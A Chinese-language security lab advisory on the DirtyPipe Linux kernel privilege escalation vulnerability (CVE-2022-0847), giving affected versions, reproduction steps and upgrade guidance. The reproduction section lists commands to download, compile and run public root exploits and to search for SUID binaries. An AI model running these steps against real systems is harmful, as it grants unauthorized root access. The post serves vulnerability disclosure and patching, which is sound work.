乌特拉安全实验室丨DirtyPipe Linux 内核提权漏洞（CVE-2022-0847）
2022-03-23 14:08:50

漏洞描述

CVE-2022-0847-DirtyPipe-ExploitCVE-2022-0847是存在于Linux内核5.8及之后版本中的本地提权漏洞。攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权root。CVE-2022-0847的漏洞原理类似于CVE-2016-5195脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为“Dirty Pipe”。


影响范围

影响范围：5.8 <= Linux 内核版本 < 5.16.11 / 5.15.25 / 5.10.102


漏洞复现

方法一：

使用Dirty-Pipe.sh文件进行提权，附下载链接https://github.com/imfiver/CVE-2022-0847

cd CVE-2022-0847
ls
whoami
bash ./Dirty-Pipe.sh
whoami

方法二：

使用dirtypipez.c文件进行提权，附下载链接https://haxx.in/files/dirtypipez.c

mkdir dirtypipez
cd dirtypipez
wget https://haxx.in/files/dirtypipez.c
gcc dirtypipez.c -o dirtypipez

find / -perm -u=s -type f 2>/dev/nul

在使用这个POC时，需要事先找到一个具有 SUID 权限的可执行文件，然后利用这个文件进行提权，使用以下命令可以找到这类文件。

find / -perm -u=s -type f 2>/dev/nul


漏洞修复

更新升级 Linux 内核到以下安全版本：Linux 内核 >= 5.16.11Linux 内核 >= 5.15.25Linux 内核 >= 5.10.102
